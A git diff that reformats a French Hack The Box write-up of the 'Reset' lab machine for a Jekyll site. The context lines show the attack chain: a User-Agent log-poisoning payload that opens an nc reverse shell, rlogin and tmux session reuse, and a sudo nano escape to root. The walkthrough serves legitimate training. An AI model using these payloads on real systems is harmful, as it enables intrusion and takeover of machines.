@@ -1,22 +1,23 @@
 ---
+layout: writeup
 title: Reset
 description: reset me this!
-tags:
-  - HTB
-  - machine
+excerpt: reset me this!
 date: 2026-03-30T16:52
-tasks:
-  - format
-parent file:
-  - 
+platform: htb
+permalink: /writeups/htb/season8/reset/
 os: linux
 difficulty: easy
-category:
-  - writeups
-  - htb
-season: "8"
-seasonal: no
+season: '8'
+tags:
+- HTB
+- linux
+- easy
+prev_url: /writeups/htb/season8/manage/
+next_url: /writeups/htb/season8/data/
 ---
+
+{% raw %}
 
 # Foothold
 
@@ -51,18 +52,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 On commence par se connecter au port `512` et on trouve un script qui nous pose une question, `513` ne nous donne rien et `514` non plus.
 
 Sur la page web on trouve seulement une page de connexion.
-![[Pasted image 20260330165854.png]]
+<img class="content-image" src="/assets/content/htb/season8-reset/Pasted%20image%2020260330165854.png" alt="Reset" loading="lazy">
 
 De tous les scans ffuf, seul un nous retourne une page intéressante:
-![[Pasted image 20260330171058.png]]
+<img class="content-image" src="/assets/content/htb/season8-reset/Pasted%20image%2020260330171058.png" alt="Reset" loading="lazy">
 
 On tente de réinitialiser un mot de passe et on trouve, en inspectant la réponse, que l'on nous donne le mot de passe (on la trouve en inspectant avec burp).
-![[Pasted image 20260330174729.png]]
+<img class="content-image" src="/assets/content/htb/season8-reset/Pasted%20image%2020260330174729.png" alt="Reset" loading="lazy">
 
 On voit que l'on peut afficher le contenu de fichiers logs sur la page principale. On continue avec burp et on voit qu'on peut modifier le fichier que le script va chercher. 
 
 On peut tester les fichiers et trouver un fichier que l'on peut lire: `/var/log/apache2/access.log` et on voit dedans le nom du user-agent qui est affiché.
-![[Pasted image 20260331164210.png]]
+<img class="content-image" src="/assets/content/htb/season8-reset/Pasted%20image%2020260331164210.png" alt="Reset" loading="lazy">
 
 On utilise donc cela pour effectuer log poisonning:
 ```
@@ -70,7 +71,7 @@ User-Agent: <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 
 ```
 
 Et voilà, notre reverse shell
-![[Pasted image 20260331164438.png]]
+<img class="content-image" src="/assets/content/htb/season8-reset/Pasted%20image%2020260331164438.png" alt="Reset" loading="lazy">
 
 # Privilege Escalation to user
 
@@ -105,7 +106,7 @@ qui nous dit que sadm peut se connecter en tant que n'importe quel utilisateur s
 rlogin reset.htb -l sadm -i sadm
 ```
 
-![[Pasted image 20260331222101.png]]
+<img class="content-image" src="/assets/content/htb/season8-reset/Pasted%20image%2020260331222101.png" alt="Reset" loading="lazy">
 
 (il faut noter que l'on aurait pu créer un utilisateur `sadm` et se connecter de la sorte à l'utilisateur `sadm` des r-services, sans l'aide de `-i`)
 
@@ -123,7 +124,7 @@ tmux attach -t sadm_session
 ```
 
 On s'y connecte et on peut maintenant utiliser `sudo -l`
-![[Pasted image 20260401100744.png]]
+<img class="content-image" src="/assets/content/htb/season8-reset/Pasted%20image%2020260401100744.png" alt="Reset" loading="lazy">
 
 On voit que l'on a le droit de lancer nano en sudo, sur le fichier `/etc/firewall.sh`.
 
@@ -138,6 +139,7 @@ reset; sh 1>&0 2>&0
 ```
 
 Et voilà, notre root flag
-![[Pasted image 20260401101111.png]]
+<img class="content-image" src="/assets/content/htb/season8-reset/Pasted%20image%2020260401101111.png" alt="Reset" loading="lazy">
 
-![[Pasted image 20260401101256.png]]
+<img class="content-image" src="/assets/content/htb/season8-reset/Pasted%20image%2020260401101256.png" alt="Reset" loading="lazy">
+{% endraw %}
